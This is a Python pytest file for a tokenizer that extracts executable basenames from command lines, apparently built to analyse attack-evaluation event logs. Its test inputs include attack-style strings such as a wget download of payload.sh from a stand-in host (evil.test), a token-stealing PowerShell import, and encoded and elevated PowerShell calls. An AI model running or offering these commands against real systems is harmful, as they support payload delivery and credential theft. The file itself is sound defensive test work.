"""Tier-1 tests for the command-line filename tokenizer in ``app.analytics``.

The cases are verbatim tokens from a Caldera attack-evals EVTX, where quote-stripping at
the token boundary can leave syntax glued to the basename:
``"powershell.exe``, ``$commandline="cmd.exe`` and ``name='sandcat.exe``.
"""

from __future__ import annotations

import pytest

from app.analytics import extract_cmdline_basenames

EXTS = frozenset({".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".sh", ".py"})


def names(value: str) -> set[str]:
    return extract_cmdline_basenames(value, EXTS)


class TestQuotedAndEmbeddedFilenames:
    """Filenames embedded inside a larger syntactic token must come out clean."""

    def test_escaped_quote_before_name(self):
        # Nested PowerShell -C "..." — the raw token is \"powershell.exe, and
        # a naive replace("\\", "/") turns the backslash into a path separator,
        # leaving the double quote as the first character of the basename.
        assert names(r'-C "Start-Process \"powershell.exe\" -Verb RunAs"') == {"powershell.exe"}

    def test_powershell_variable_assignment(self):
        # ScriptBlockText: $CommandLine="cmd.exe /c ..." — no quote at either end
        # of the whitespace token, so boundary stripping was a no-op.
        assert names('$CommandLine="cmd.exe /c whoami"') == {"cmd.exe"}

    def test_wmi_filter_string(self):
        # Gwmi Win32_Process -Filter "Name='sandcat.exe'"
        assert names("""Gwmi Win32_Process -Filter "Name='sandcat.exe'" """) == {"sandcat.exe"}

    def test_no_result_carries_quote_or_equals(self):
        value = (
            r'powershell.exe -C "Import-Module .\StealToken.ps1;'
            r'$CommandLine="cmd.exe";Gwmi -Filter "Name=\'sandcat.exe\'""'
        )
        for name in names(value):
            assert not any(ch in name for ch in "\"'="), name
            assert not name.startswith("$"), name


class TestPlainTokensStillWork:
    """Behaviour that already worked must not regress."""

    @pytest.mark.parametrize(
        ("value", "expected"),
        [
            (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAA", {"powershell.exe"}),
            (r"-Path .\update.ps1 -Destination $env:APPDATA", {"update.ps1"}),
            (r'"C:\Program Files\tool\agent.exe" --run', {"agent.exe"}),
            ("/usr/bin/python3 /tmp/dropper.py", {"dropper.py"}),
            ("wget http://evil.test/payload.sh -O /tmp/payload.sh", {"payload.sh"}),
        ],
    )
    def test_extracts_basename(self, value, expected):
        assert names(value) == expected

    def test_extensions_outside_the_set_are_ignored(self):
        assert names(r"C:\logs\report.txt C:\a\b.docx") == set()

    def test_flag_with_equals_is_skipped(self):
        # A token that is itself a --flag=value option is not a filename.
        assert names("-ExecutionPolicy=Bypass.ps1") == set()

    def test_bare_extension_is_not_a_filename(self):
        assert names(".exe .ps1") == set()

    def test_empty_and_whitespace(self):
        assert names("") == set()
        assert names("   \t ") == set()
